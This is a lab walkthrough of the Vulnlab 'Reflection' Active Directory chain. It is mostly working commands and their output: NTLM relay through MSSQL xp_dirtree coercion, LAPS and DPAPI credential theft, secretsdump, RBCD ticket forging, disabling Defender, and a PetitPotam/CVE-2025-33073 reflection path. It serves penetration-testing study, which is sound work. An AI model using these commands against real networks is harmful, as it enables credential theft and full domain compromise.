---
icon: hat-witch
cover: ../../.gitbook/assets/Screenshot 2026-04-16 145541.png
coverY: 151.87052168447516
---

# VL-REFLECTION

## Recon | What Are We Even Looking At

Three machines. Before touching anything, I want to know what's running on each one. RustScan blasts through the ports fast, then nmap fills in the details.

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ rustscan -a 10.10.145.181,10.10.145.182,10.10.145.183 -- -sC -sV -oN scan.txt
```

**DC01 output (the domain controller):**

```
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          (Domain: reflection.vl)
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019
3389/tcp open  ms-wbt-server RDP
5985/tcp open  http          WinRM

Host script results:
smb2-security-mode:
  Message signing enabled but not required    <-- THIS RIGHT HERE
```

**MS01 output:**

```
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019
3389/tcp open  ms-wbt-server RDP
5985/tcp open  http          WinRM

smb2-security-mode:
  Message signing enabled but not required
```

**WS01 output:**

```
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server RDP

smb2-security-mode:
  Message signing enabled but not required
```

Okay so let me tell you what jumped out immediately. Three things:

First  **SMB signing is disabled on ALL THREE machines, including the domain controller.** This is huge. By default, domain controllers have SMB signing enforced. Someone explicitly turned this off, or just never configured it properly. What this means in practice  if I can get ANY machine on this network to authenticate to me over SMB, I don't need to crack the password. I can just forward that authentication to another machine and that machine will let me in. This is called NTLM relay and it's one of the most devastating attacks in AD environments. The fact that even DC01 has this misconfigured means we can potentially relay auth directly to the domain controller.

Second  **MSSQL is running on both DC01 AND MS01 on port 1433.** Having a database server on a domain controller is already a red flag. These two facts together  MSSQL and disabled SMB signing  screamed relay attack to me before I even touched anything.

Third WS01 has no MSSQL, no WinRM, just SMB and RDP. It's probably an end-user workstation. We'll get to it later.

#### /etc/hosts

```
10.10.145.181 dc01.reflection.vl reflection.vl
10.10.145.182 ms01.reflection.vl
10.10.145.183 ws01.reflection.vl
```

***

## SMB | Checking for Anonymous Access

Standard first step. Check if any of these machines let you browse SMB without credentials. In a properly hardened environment this should give nothing. Let's see.

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ nxc smb 10.10.145.181 -u '' -p '' --shares
```

```
SMB  DC01  [-] reflection.vl\: STATUS_ACCESS_DENIED
```

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ nxc smb 10.10.145.182 -u '' -p '' --shares
```

```
SMB  10.10.145.182  445  MS01  [+] reflection.vl\: (Guest)
SMB  10.10.145.182  445  MS01  Share         Permissions   Remark
SMB  10.10.145.182  445  MS01  -----         -----------   ------
SMB  10.10.145.182  445  MS01  ADMIN$                      Remote Admin
SMB  10.10.145.182  445  MS01  C$                          Default share
SMB  10.10.145.182  445  MS01  IPC$          READ          Remote IPC
SMB  10.10.145.182  445  MS01  staging       READ          staging environment
```

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ nxc smb 10.10.145.183 -u '' -p '' --shares
```

```
SMB  WS01  [-] reflection.vl\: STATUS_ACCESS_DENIED
```

MS01 has a share called `staging` that anyone can read with no credentials. The comment literally says "staging environment"  this is a development/test setup that got left exposed. This is incredibly common in real organizations. Dev teams spin up staging environments to test things and they never lock them down properly because "it's just for testing." Except the machine is sitting on the same network as production.

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ smbclient //10.10.145.182/staging -N
```

```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jun  7 13:42:48 2023
  ..                                  D        0  Wed Jun  7 13:41:25 2023
  staging_db.conf                     A       50  Thu Jun  8 07:21:49 2023

smb: \> get staging_db.conf
getting file \staging_db.conf of size 50
smb: \> exit
```

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ cat staging_db.conf
```

```
user=web_staging
password=Washroom510
db=staging
```

Database credentials sitting in a plaintext config file on an anonymously accessible share. This is the kind of thing that gets companies breached in real life. Someone put credentials in a config file, which is already bad practice, and then left that config file in a share that literally anyone can read.

We have `web_staging:Washroom510`. MS01 has MSSQL running. Connect.

***

## MSSQL on MS01 -  Staging Database

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ impacket-mssqlclient web_staging:Washroom510@ms01.reflection.vl
```

```
[*] Encryption required, switching to TLS
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (web_staging  guest@master)>
```

We're in. Let's look around.

```sql
SQL (web_staging  guest@master)> SELECT name FROM master.dbo.sysdatabases;
```

```
name
-------
master
tempdb
model
msdb
staging
```

```sql
SQL (web_staging  guest@master)> use staging;
SQL (web_staging  dbo@staging)> select * from staging.information_schema.tables;
```

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
staging        dbo           users       BASE TABLE
```

```sql
SQL (web_staging  dbo@staging)> select * from users;
```

```
id  username  password
1   dev01     Initial123
2   dev02     Initial123
```

Dev accounts with default passwords. Tried them on the domain invalid. These are just local test accounts, not real domain users. So the database itself isn't giving us anything useful directly.

What about command execution? MSSQL has `xp_cmdshell` which can run OS commands if enabled.

```sql
SQL (web_staging  dbo@staging)> EXEC xp_cmdshell 'whoami';
```

```
[-] ERROR(MS01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 
'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is 
turned off as part of the security configuration for this server.
```

Disabled. Expected. But MSSQL has another trick  `xp_dirtree`.

***

### xp\_dirtree - Forcing the Server to Authenticate to Us

Here's how this works and why it matters. `xp_dirtree` is a stored procedure that lists the contents of a directory. The interesting thing is it also works with UNC paths  network paths like `\\someserver\share`. When Windows tries to access a network path, it automatically does NTLM authentication. It sends the credentials of whatever user is running the process.

So if I run `xp_dirtree '\\my-ip\anything'`, the MSSQL server will try to connect to MY machine over SMB, and in doing so it will send me the NTLMv2 hash of the service account running MSSQL. I can either try to crack that hash, or since SMB signing is disabled everywhere relay it directly to another machine.

First let's capture the hash and try cracking it.

Start a listener:

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ impacket-smbserver -smb2support share .
```

Trigger it from the SQL session:

```sql
SQL (web_staging  dbo@staging)> exec xp_dirtree '\\10.8.2.138\share',1,1;
```

Back on our listener:

```
[*] Incoming connection (10.10.145.182,55778)
[*] AUTHENTICATE_MESSAGE (REFLECTION\svc_web_staging,MS01)
[*] User MS01\svc_web_staging authenticated successfully
[*] svc_web_staging::REFLECTION:aaaaaaaaaaaaaaaa:cfc155155ca558d2e424fe9084f4215c:010100000000000080...
[snip]
```

Got the NTLMv2 hash of `svc_web_staging`. Save it and try to crack:

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ john svc_web_staging.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
0g 0:00:00:04 DONE — 0g/s 3208Kp/s
Session completed.
```

Nothing. Password isn't in rockyou. Most people get stuck here. But remember  SMB signing is disabled everywhere. We don't need to crack the hash. We can just relay it.

***

## NTLM Relay Attack&#x20;

### Getting Into DC01's File Shares

Let me explain this attack properly because it's the heart of this chain.

NTLM authentication works like a challenge-response thing. Server sends you a challenge, you encrypt it with your password hash, send it back, server verifies. The problem is  if you're a man in the middle, you can intercept that challenge-response conversation and forward it to a completely different server. That other server will think you are the original user and let you in.

The only protection against this is SMB signing. With signing enabled, every message is cryptographically signed so the server can verify the message actually came from who it claims. With signing disabled, there's no verification. We can take `svc_web_staging`'s authentication and replay it anywhere on the network.

The attack flow:

1. We tell `ntlmrelayx` to listen for incoming NTLM connections
2. We use `xp_dirtree` to make MS01's MSSQL service try to authenticate to us
3. Instead of capturing the hash, we immediately forward that authentication to DC01's SMB
4. DC01 thinks `svc_web_staging` is connecting, accepts it, and we get an authenticated session
5. We use `-socks` so the connection stays alive and we can browse shares through it

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ cat hosts.txt
10.10.145.181
10.10.145.182
10.10.145.183
```

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ impacket-ntlmrelayx -smb2support -socks -tf hosts.txt
```

```
[*] Protocol Client SMB loaded..
[*] Running in relay mode to hosts in targetfile
[*] SOCKS proxy started. Listening on 127.0.0.1:1080
[*] Servers started, waiting for connections
```

Now trigger the authentication from the MSSQL session:

```sql
SQL (web_staging  dbo@staging)> exec xp_dirtree '\\10.8.2.138\share',1,1;
```

Watch ntlmrelayx:

```
[*] Received connection from REFLECTION/svc_web_staging at MS01
[*] SMBD-Thread-9: Connection from REFLECTION/SVC_WEB_STAGING@10.10.145.182
    controlled, attacking target smb://10.10.145.181
[*] Authenticating against smb://10.10.145.181 as REFLECTION/SVC_WEB_STAGING SUCCEED
[*] SOCKS: Adding REFLECTION/SVC_WEB_STAGING@10.10.145.181(445) to active SOCKS connection. Enjoy
```

We successfully authenticated to DC01 as `svc_web_staging`. Now configure proxychains to go through the SOCKS proxy:

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ cat /etc/proxychains4.conf
[ProxyList]
socks4  127.0.0.1  1080
```

Browse DC01's SMB shares through the relay:

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ proxychains impacket-smbclient reflection/svc_web_staging@10.10.145.181
```

```
[proxychains] Strict chain ... 127.0.0.1:1080 ... 10.10.145.181:445 ... OK
Password: (type anything, the relay handles auth)

# shares
ADMIN$
C$
IPC$
NETLOGON
prod
SYSVOL
```

There's a `prod` share on the domain controller. That's the production environment. Let's get in.

```
# use prod
# ls
prod_db.conf

# get prod_db.conf
```

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ cat prod_db.conf
```

```
user=web_prod
password=Tribesman201
db=prod
```

Production database credentials. `web_prod:Tribesman201`. The DC is running MSSQL on port 1433, let's hit the prod database directly.

***

## MSSQL on DC01&#x20;

### Production Database Has Real User Credentials

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ impacket-mssqlclient web_prod:Tribesman201@10.10.145.181
```

```
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
SQL (web_prod  guest@master)>
```

```sql
SQL (web_prod  guest@master)> use prod;
SQL (web_prod  dbo@prod)> select * from prod.information_schema.tables;
```

```
TABLE_NAME
----------
users
```

```sql
SQL (web_prod  dbo@prod)> select * from users;
```

```
id  name            password
1   abbie.smith     CMe1x+nlRaaWEw
2   dorothy.rose    hC_fny3OK9glSJ
```

Now these look like real people, not test accounts. The production database is storing domain user credentials in plaintext. Let's verify they're actually domain accounts:

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ nxc smb 10.10.145.181 -u abbie.smith -p 'CMe1x+nlRaaWEw'
```

```
SMB  DC01  [+] reflection.vl\abbie.smith:CMe1x+nlRaaWEw
```

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ nxc smb 10.10.145.181 -u dorothy.rose -p 'hC_fny3OK9glSJ'
```

```
SMB  DC01  [+] reflection.vl\dorothy.rose:hC_fny3OK9glSJ
```

Both valid. We now have two domain user accounts. Time to map the entire domain.

***

## BloodHound&#x20;

### Mapping the Domain

BloodHound collects data about every user, computer, group, and permission in the domain and turns it into a graph. The key question is always who has permissions over what, and can we chain those permissions to reach Domain Admin.

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ bloodhound-python -d reflection.vl -u abbie.smith -p 'CMe1x+nlRaaWEw' -ns 10.10.145.181 -c all --zip
```

```
INFO: Found AD domain: reflection.vl
INFO: Found 3 computers
INFO: Found 18 users
INFO: Found 54 groups
INFO: Done in 00M 19S
```

Import the zip into BloodHound and start hunting for attack paths.

<figure><img src="../../.gitbook/assets/image (665).png" alt=""><figcaption></figcaption></figure>

findings:

**`abbie.smith` has `GenericAll` over `MS01`.**

`GenericAll` is basically god mode over an object. It means you have full control you can read any attribute, write any attribute, reset passwords, add yourself to groups, whatever. Over a computer object specifically, this opens up several attacks. We can modify delegation settings, read LAPS passwords if LAPS is enabled, or do other nasty things.

Before anything, check Machine Account Quota if it's above 0, we could create our own computer account and use that for RBCD. If it's 0, we need a machine account we already own.

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ nxc ldap 10.10.145.181 -u abbie.smith -p 'CMe1x+nlRaaWEw' -M maq
```

```
MAQ  DC01  MachineAccountQuota: 0
```

Zero. We can't create computer accounts. But let's check if LAPS is enabled on MS01. LAPS (Local Administrator Password Solution) is a Microsoft feature where every machine gets a unique, randomly generated local administrator password that rotates periodically. The password is stored as an attribute on the computer object in Active Directory. With `GenericAll`, we can read that attribute directly.

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ nxc smb 10.10.145.182 -u abbie.smith -p 'CMe1x+nlRaaWEw' --laps
```

```
SMB  MS01  [*] Windows Server 2022 Build 20348 x64
SMB  MS01  [+] MS01\administrator:H447.++h6g5}xi (Pwn3d!)
```

There it is. MS01's local administrator password is `H447.++h6g5}xi`. The `(Pwn3d!)` means we have local admin rights.

***

## MS01&#x20;

### Getting In and Dumping Everything

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ evil-winrm -i 10.10.145.182 -u administrator -p 'H447.++h6g5}xi'
```

```
Evil-WinRM shell v3.7
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
ms01
```

First flag is on this machine. Grab it and move on.

Now the question is what can we get from this machine that helps us move further? I always start with `secretsdump` because it gets you LSA secrets, SAM hashes, cached domain credentials, and service account plaintext passwords all in one go.

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ impacket-secretsdump administrator:'H447.++h6g5}xi'@ms01.reflection.vl
```

```
[*] Target system bootKey: 0xf0093534e5f21601f5f509571855eeee
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3819a8ecec5fd33f6ecb83253b24309a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
labadm:1000:aad3b435b51404eeaad3b435b51404ee:2a50f9a04b270a24fcd474092ebd9c8e:::

[*] Dumping cached domain logon information
REFLECTION.VL/svc_web_staging:$DCC2$10240#svc_web_staging#6123c7b97...
REFLECTION.VL/Georgia.Price:$DCC2$10240#Georgia.Price#f20a83b9452c...

[*] Dumping LSA Secrets
[*] $MACHINE.ACC
REFLECTION\MS01$:aad3b435b51404eeaad3b435b51404ee:0e00baa16b0f4b6bb9d66e8695dbce8e:::

[*] _SC_MSSQL$SQLEXPRESS
REFLECTION\svc_web_staging:DivinelyPacifism98     <-- plaintext password
```

Two important things came out of this:

`MS01$` machine account NT hash: `0e00baa16b0f4b6bb9d66e8695dbce8e`  this is the computer account for MS01. Computer accounts have SPNs (Service Principal Names) registered to them, which makes them usable for Kerberos delegation attacks. We'll need this for RBCD later.

`svc_web_staging` plaintext password: `DivinelyPacifism98` the MSSQL service account password is stored in LSA secrets because the MSSQL service runs as that account and Windows needs to store the credentials to start the service. Another alternative RBCD path with this.

But what about `Georgia.Price`? We see a cached login but no plaintext. She's logged into this machine recently. Where are her actual credentials?

***

## DPAPI&#x20;

### Harvesting Credentials From the Windows Vault

DPAPI (Data Protection API) is how Windows encrypts stored secrets saved browser passwords, WiFi passwords, credentials stored by applications, and most importantly for us credentials saved by Task Scheduler for scheduled tasks that run as a specific user.

When you create a scheduled task that runs as `REFLECTION\Georgia.Price`, Windows has to store her credentials somewhere so it can authenticate as her when the task runs. It stores them in the Windows Credential Vault, encrypted with DPAPI. When we're local admin, we can decrypt these.

NetExec makes this easy:

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ nxc smb ms01.reflection.vl -u administrator -p 'H447.++h6g5}xi' --dpapi --local-auth
```

```
SMB  MS01  [+] MS01\administrator:H447.++h6g5}xi (Pwn3d!)
SMB  MS01  [*] Collecting DPAPI masterkeys...
SMB  MS01  [+] Got 8 decrypted masterkeys. Looting secrets...
SMB  MS01  [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{013CD3ED-72CB-4801-99D7-8E7CA1F7E370}
           REFLECTION\Georgia.Price:DBl+5MPkpJg5id
```

`Georgia.Price:DBl+5MPkpJg5id` her credentials were stored for a scheduled task. The `Domain:batch=TaskScheduler` part is the Windows Credential Manager type that indicates these are task scheduler credentials.

Back in BloodHound, look at Georgia's permissions:

**`Georgia.Price` has `GenericAll` over `WS01`.**

Same pattern as before. But WS01 doesn't have LAPS configured, so we can't just read a password this time. We need to do RBCD.

***

## WS01&#x20;

### Resource-Based Constrained Delegation (RBCD) Attack

Let me explain RBCD properly because this is one of the more complex attacks and it's worth understanding what's actually happening.

Kerberos has a delegation feature that lets services impersonate users. Classic example you log into a web app, the web app needs to query a database on your behalf. Delegation lets the web server get a ticket for the database while impersonating you.

RBCD (Resource-Based Constrained Delegation) is a newer variant where the **target** resource controls who's allowed to delegate to it. There's an attribute on every computer object called `msDS-AllowedToActOnBehalfOfOtherIdentity`. Whatever computer account is in that attribute is allowed to impersonate ANY user when accessing that machine.

Here's why this is attackable: Georgia has `GenericAll` over WS01, which means she can write to WS01's attributes including `msDS-AllowedToActOnBehalfOfOtherIdentity`. We can put MS01's machine account in that attribute. Then we use MS01's credentials to request a Kerberos service ticket while pretending to be Administrator. The KDC issues the ticket because MS01 is in WS01's allowed list. We use that ticket to authenticate to WS01 AS Administrator.

Prerequisite: We need a machine account with an SPN. MS01$ qualifies it has SPNs registered automatically. We have its NT hash from the secretsdump.

#### **Write MS01$ into WS01's delegation attribute**

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ impacket-rbcd -delegate-from 'MS01$' -delegate-to 'WS01$' -action 'write' 'reflection.vl/Georgia.Price:DBl+5MPkpJg5id' -dc-ip 10.10.145.181
```

```
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] MS01$ can now impersonate users on WS01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     MS01$   (S-1-5-21-3375389138-1770791787-1490854311-1104)
```

#### **Request a service ticket impersonating Administrator, using MS01$'s hash**

This uses the S4U2Self and S4U2Proxy Kerberos extensions. S4U2Self lets a service get a ticket for itself on behalf of any user. S4U2Proxy lets it then use that ticket to access another service. Combined, they let MS01$ get a ticket to access WS01's CIFS service as Administrator.

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ impacket-getST -spn 'cifs/WS01.reflection.vl' -impersonate Administrator -dc-ip 10.10.145.181 'Reflection/MS01$' -hashes ':0e00baa16b0f4b6bb9d66e8695dbce8e'
```

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WS01.reflection.vl@REFLECTION.VL.ccache
```

We now have a Kerberos ticket that says we're Administrator accessing WS01's file system. The domain controller itself signed and issued this ticket.

#### **Use the ticket to dump WS01's secrets**

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ export KRB5CCNAME=Administrator@cifs_WS01.reflection.vl@REFLECTION.VL.ccache

┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ impacket-secretsdump administrator@WS01.reflection.vl -k -no-pass
```

```
[*] Target system bootKey: 0x7ed33ac4a19a5ea7635d402e58c0055f
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29542cb2707bf6d6c1d2c9311b0ff02:::
labadm:1001:aad3b435b51404eeaad3b435b51404ee:a29542cb2707bf6d6c1d2c9311b0ff02:::

[*] Dumping cached domain logon information
REFLECTION.VL/Rhys.Garner:$DCC2$10240#Rhys.Garner#99152b74dac4cc4b9763...

[*] Dumping LSA Secrets
[*] $MACHINE.ACC
REFLECTION\WS01$:aad3b435b51404eeaad3b435b51404ee:c4255d5979659e1532657d8f610ea037:::

[*] DefaultPassword
reflection.vl\Rhys.Garner:knh1gJ8Xmeq+uP       <-- plaintext
```

`DefaultPassword` is an LSA secret that Windows stores when auto-logon is configured. Someone set up WS01 to automatically log in as Rhys.Garner, and Windows stored his password there. We got it in plaintext.

Get the flag from WS01. Disable Defender first since it'll block PSExec:

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ impacket-atexec -hashes ':a29542cb2707bf6d6c1d2c9311b0ff02' 'ws01/administrator@WS01.reflection.vl' 'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"'
```

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ impacket-psexec administrator@WS01.reflection.vl -hashes ':a29542cb2707bf6d6c1d2c9311b0ff02'
```

```
Microsoft Windows [Version 10.0.19045.2965]
C:\Windows\system32>
```

Second flag down.

***

## DC01&#x20;

### Credential Reuse Gets Us Domain Admin

`Rhys.Garner` doesn't have any interesting domain permissions according to BloodHound. No special group memberships, no interesting ACLs. I was looking at the domain users list when something clicked.

There's a user called `dom_rgarner` in the Domain Admins group.

Break that down: `dom_` is almost certainly short for "domain" indicating this is the privileged account. `rgarner` is clearly `r` + `garner` first initial, last name which maps exactly to `Rhys Garner`.

This is a super common corporate practice give privileged users a separate account for admin tasks. The idea is you use your normal account day-to-day and only use the DA account when you need to do admin stuff. Good in theory. Terrible in practice if they reuse the same password across both accounts, which people almost always do.

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ nxc smb 10.10.145.181 -u dom_rgarner -p 'knh1gJ8Xmeq+uP' -d reflection.vl
```

```
SMB  DC01  [+] reflection.vl\dom_rgarner:knh1gJ8Xmeq+uP (Pwn3d!)
```

Same password. We're Domain Admin.

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ evil-winrm -i dc01.reflection.vl -u dom_rgarner -p 'knh1gJ8Xmeq+uP'
```

```
*Evil-WinRM* PS C:\Users\dom_rgarner\Documents> whoami /groups | findstr "Domain Admins"
REFLECTION\Domain Admins
```

Full domain compromise. Third flag on the DC.

***

## Alternative Path 1&#x20;

### RBCD Using svc\_web\_staging Instead of MS01$

There's a cleaner route that avoids needing the MS01$ hash. Remember `svc_web_staging` has an SPN (`MSSQL/ms01.reflection.vl`)  that means it qualifies as a delegation principal just like a machine account. And we got its plaintext password from LSA secrets: `DivinelyPacifism98`.

With Georgia's GenericAll over WS01 we can put `svc_web_staging` in the delegation attribute instead:

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ impacket-rbcd -delegate-from 'svc_web_staging' -delegate-to 'WS01$' -action 'write' 'reflection.vl/Georgia.Price:DBl+5MPkpJg5id' -dc-ip 10.10.145.181
```

```
[*] svc_web_staging can now impersonate users on WS01$ via S4U2Proxy
```

Now we can impersonate `dom_rgarner` directly (since we already know that account exists) and get a ticket:

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ impacket-getST -spn 'cifs/WS01.reflection.vl' -impersonate 'dom_rgarner' 'reflection.vl/svc_web_staging:DivinelyPacifism98'
```

```
[*] Impersonating dom_rgarner
[*] Saving ticket in dom_rgarner@cifs_WS01.reflection.vl@REFLECTION.VL.ccache
```

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ export KRB5CCNAME=dom_rgarner@cifs_WS01.reflection.vl@REFLECTION.VL.ccache

┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ impacket-secretsdump -k -no-pass dom_rgarner@WS01.reflection.vl
```

Since `dom_rgarner` is a domain admin, secretsdump works on WS01 and we skip the whole Rhys.Garner password reuse discovery step. You can then use those credentials straight on the DC.

***

## Alternative Path 2 &#x20;

### CVE-2025-33073 DNS + NTLM Reflection

This is a newer technique published by Synacktiv. Instead of coercing authentication from MS01 via MSSQL, we register a fake DNS record in the domain (which any authenticated user can do by default) that points to our machine. Then we use PetitPotam to force the DC itself to authenticate to that DNS name. Since the DC connects to our machine, we relay its authentication back to... itself. The DC ends up authenticating to its own SMB service as SYSTEM, and we dump SAM hashes.

Register a malicious DNS record pointing to our attacker IP:

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ python3 dnstool.py -u 'reflection.vl\abbie.smith' -p 'CMe1x+nlRaaWEw' 10.10.145.181 -a add -d 10.8.2.138 -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
```

```
[+] LDAP operation completed successfully
```

Verify it got created:

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ python3 dnstool.py -u 'reflection.vl\abbie.smith' -p 'CMe1x+nlRaaWEw' 10.10.145.181 -a query -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
```

```
[+] Found record localhost1UWhRC...
[+] Record entry:
 - Type: 1 (A)
 - Address: 10.8.2.138
```

Start the relay targeting DC01:

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ impacket-ntlmrelayx -t "smb://dc01.reflection.vl" -smb2support
```

Force DC01 to authenticate to our fake DNS name using PetitPotam (abusing MS-EFSRPC):

```
┌──(sn0x㉿sn0x)-[~/Vulnlab/Reflection]
└─$ nxc smb dc01.reflection.vl -u abbie.smith -p 'CMe1x+nlRaaWEw' -M coerce_plus -o METHOD=Petitpotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

```
COERCE_PLUS  DC01  VULNERABLE, PetitPotam
COERCE_PLUS  DC01  Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

Back in ntlmrelayx:

```
[*] SMBD-Thread-5: Received connection from 10.10.145.181, attacking smb://dc01.reflection.vl
[*] Authenticating against smb://dc01.reflection.vl as / SUCCEED
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a87a3e893c70111c8cad0ecbda9f4002:::
```

DC's local admin hash. Completely bypassing the whole chain from a single domain user account. This works because DC01 has SMB signing disabled normally a DC would have it enforced and this relay would fail.

***

### Attack Flow

```
NMAP Recon
  └── SMB Signing DISABLED on all 3 machines (including DC01)
  └── MSSQL running on DC01 and MS01

Anonymous SMB on MS01
  └── staging share accessible
  └── staging_db.conf -> web_staging:Washroom510

MSSQL Login (MS01) as web_staging
  └── staging DB -> dev01/dev02 (useless, invalid domain accounts)
  └── xp_cmdshell blocked
  └── xp_dirtree -> NTLMv2 hash of svc_web_staging (uncrackable)
  └── SMB signing disabled -> RELAY instead of crack

NTLM Relay Attack (svc_web_staging -> DC01 SMB)
  └── ntlmrelayx -socks -> authenticated session on DC01
  └── prod share on DC01 -> prod_db.conf -> web_prod:Tribesman201

MSSQL Login (DC01) as web_prod
  └── prod DB users table -> abbie.smith:CMe1x+nlRaaWEw
                          -> dorothy.rose:hC_fny3OK9glSJ

BloodHound enumeration as abbie.smith
  └── abbie.smith -> GenericAll -> MS01 (computer object)
  └── Machine Account Quota = 0

LAPS Read (GenericAll abuse on MS01)
  └── MS01 local admin password -> H447.++h6g5}xi
  └── [FLAG 1 - MS01]

MS01 Post-Exploitation
  └── secretsdump -> MS01$ NT hash (0e00baa16b0f4b6bb9d66e8695dbce8e)
                  -> svc_web_staging plaintext (DivinelyPacifism98)
  └── DPAPI dump -> Georgia.Price:DBl+5MPkpJg5id (scheduled task vault)

BloodHound: Georgia.Price -> GenericAll -> WS01
  └── LAPS not configured on WS01
  └── RBCD attack using MS01$ machine account

RBCD Attack on WS01
  └── Write MS01$ to WS01's msDS-AllowedToActOnBehalfOfOtherIdentity
  └── getST.py impersonating Administrator (using MS01$ hash)
  └── secretsdump on WS01 -> Rhys.Garner:knh1gJ8Xmeq+uP (DefaultPassword)
  └── [FLAG 2 - WS01]

Domain Admin via Credential Reuse
  └── dom_rgarner in Domain Admins (dom_ prefix + rgarner = Rhys Garner)
  └── Password reuse: knh1gJ8Xmeq+uP works on dom_rgarner
  └── [FLAG 3 - DC01]
```

***

### Techniques I Used

| Technique                                    | Where Used                                            |
| -------------------------------------------- | ----------------------------------------------------- |
| Anonymous SMB Enumeration                    | MS01 staging share, found db credentials              |
| MSSQL Authenticated Enumeration              | web\_staging on MS01, web\_prod on DC01               |
| xp\_dirtree NTLM Coercion                    | Forced svc\_web\_staging to authenticate to attacker  |
| NTLMv2 Hash Capture                          | svc\_web\_staging hash via xp\_dirtree + SMB listener |
| NTLM Relay Attack (ntlmrelayx + SOCKS)       | Relayed svc\_web\_staging auth to DC01 SMB            |
| SMB Signing Disabled Abuse                   | Core enabler for relay attack on all three machines   |
| LAPS Password Read                           | GenericAll on MS01 -> local admin credentials         |
| DPAPI Credential Vault Dump                  | Georgia.Price credentials from scheduled task vault   |
| LSA Secrets Dump                             | svc\_web\_staging plaintext password, MS01$ NT hash   |
| Resource-Based Constrained Delegation (RBCD) | MS01$ delegated to WS01$, impersonated Administrator  |
| Kerberos S4U2Self + S4U2Proxy                | getST.py to get impersonation service ticket          |
| DefaultPassword LSA Secret                   | Rhys.Garner plaintext from WS01 auto-logon config     |
| Credential Reuse                             | Rhys.Garner password reused on dom\_rgarner (DA)      |
| CVE-2025-33073 DNS + NTLM Reflection (bonus) | DNS injection + PetitPotam coerce -> DC SAM dump      |
| DPAPI Masterkey Decryption                   | nxc --dpapi for credential vault harvesting           |

